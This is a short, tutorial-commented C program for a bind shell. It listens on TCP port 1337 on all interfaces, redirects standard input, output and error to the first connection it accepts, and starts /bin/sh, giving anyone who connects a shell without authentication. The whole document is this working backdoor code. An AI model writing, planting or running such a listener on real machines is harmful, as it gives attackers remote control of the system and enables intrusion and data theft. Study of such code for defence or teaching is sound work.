#include<stdio.h>
#include<sys/socket.h>
#include<netinet/in.h>

int main() {

// Declaring necessary variables and structures.

int s, c, a;
struct sockaddr_in ourgate;
ourgate.sin_family = AF_INET;
ourgate.sin_port = htons(1337);
ourgate.sin_addr.s_addr = INADDR_ANY;

// We create our socket.

s = socket(AF_INET, SOCK_STREAM, 0);

// We bind our socket to our desired paramaters (port, address, protocol).

bind(s, (struct sockaddr*)&ourgate, sizeof(struct sockaddr));

// We start listening and accepting connections.

listen(s,4);

c = sizeof(struct sockaddr_in*);
a = accept(s, (struct sockaddr*)&ourgate, &c);

// We duplicate file descriptors to our socket.

dup2(a,0);
dup2(a,1);
dup2(a,2);

// And finally we spawn a shell the will now interact with our socket.

execve("/bin/sh", NULL, NULL);

}
